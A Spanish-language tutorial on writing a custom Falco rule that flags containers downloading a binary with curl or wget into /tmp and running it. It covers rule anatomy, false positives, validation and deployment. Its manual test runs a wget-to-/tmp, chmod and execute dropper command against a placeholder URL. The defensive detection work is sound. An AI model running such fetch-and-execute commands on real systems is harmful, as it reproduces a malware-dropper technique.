# Ejemplo 02 — Anatomía de una regla Falco custom

> Lectura y análisis. Comparar `custom-rules.yaml` con las reglas por defecto para interiorizar la gramática.

## Caso

Queremos detectar un patrón de "live-off-the-land" clásico: un proceso dentro de un contenedor descarga un binario con `curl` o `wget` a `/tmp` y lo ejecuta inmediatamente. Esto cubre buena parte de los droppers de malware comunes.

## 1. Anatomía de una regla

```yaml
- rule: <nombre único y legible>
  desc: <una línea de descripción>
  condition: <expresión booleana sobre campos>
  output: <string con placeholders %campo>
  priority: <EMERGENCY|ALERT|CRITICAL|ERROR|WARNING|NOTICE|INFO|DEBUG>
  tags: [<lista libre>]
  source: syscall    # o k8s_audit
```

Y de ser útil, **macros** reutilizables:

```yaml
- macro: tmp_executable
  condition: fd.directory = "/tmp" and (fd.name endswith ".sh" or fd.name endswith "")
```

## 2. Regla propuesta

Ver `custom-rules.yaml` en este directorio.

```yaml
- macro: download_tools
  condition: proc.name in (curl, wget)

- rule: Download and execute from tmp
  desc: >
    Un proceso descargó un archivo a /tmp y, en el mismo contenedor,
    otro proceso ejecutó un binario desde /tmp. Patrón común de dropper.
  condition: >
    spawned_process and container
    and proc.exepath startswith "/tmp/"
    and proc.aname[2] in (curl, wget, sh, bash)
  output: >
    Posible dropper: binario ejecutado desde /tmp tras descarga
    (user=%user.name container=%container.name image=%container.image.repository
     exe=%proc.exepath cmdline=%proc.cmdline parent=%proc.pname)
  priority: WARNING
  tags: [container, dropper, mitre_execution, T1105]
  source: syscall
```

## 3. Decisiones de diseño

- **Macro `download_tools`**: deja la condición principal legible y la macro se reutiliza en otras reglas (p. ej. "download followed by write to /etc").
- **`proc.exepath startswith "/tmp/"`**: capturamos el momento del `execve`; el archivo ya está en `/tmp` y acaba de arrancar.
- **`proc.aname[2]`**: el ancestro 2 saltos arriba. Buscamos que la cadena venga de un shell o de la herramienta de descarga; esto evita FP cuando un binario legítimo acaba por casualidad en `/tmp` por un init container.
- **`priority: WARNING`**: no es `CRITICAL` porque puede ser un script interno; sí es `WARNING` porque merece investigación.
- **No `Sigkill`**: Falco no enforce; para enforcement equivalente verías Tetragon (ejemplo 03).

## 4. Falsos positivos esperados

- CI runners legítimos que descargan y ejecutan binarios en `/tmp` (p. ej. `install.sh` de herramientas).
- Mitigación: `and not container.image.repository in (ci_runner_images)` o `exceptions` nombradas.

## 5. Falsos negativos esperados

- Si el atacante renombra la descarga a `/opt/x`, la regla no dispara (está anclada en `/tmp`).
- Mitigación: regla hermana `Exec from writable world-writable dir` que cubre `/tmp`, `/var/tmp`, `/dev/shm`.

## 6. Probar la regla sin cluster

Falco provee `falco --list` y `--validate` para probar reglas sin eventos reales. Si tienes `falco` instalado:

```bash
falco --validate custom-rules.yaml
```

Si no, al menos verifica YAML válido:

```bash
python3 -c "import yaml, sys; yaml.safe_load(open('custom-rules.yaml'))" && echo OK
```

## 7. Cargar la regla en el cluster (si tienes el ejemplo 01 montado)

```bash
kubectl -n falco create configmap custom-rules \
  --from-file=custom-rules.yaml --dry-run=client -o yaml \
  | kubectl apply -f -

# Reinstalar Falco con la rules mounted:
helm upgrade falco falcosecurity/falco -n falco \
  --reuse-values \
  --set-file customRules."custom-rules\.yaml"=custom-rules.yaml
```

## 8. Verificación manual

```bash
kubectl run dropper --image=alpine --restart=Never -- sh -c \
  "wget -qO /tmp/x https://example.com/does-not-matter; chmod +x /tmp/x; /tmp/x || true; sleep 3600"
kubectl -n falco logs ds/falco | grep "Download and execute from tmp"
```
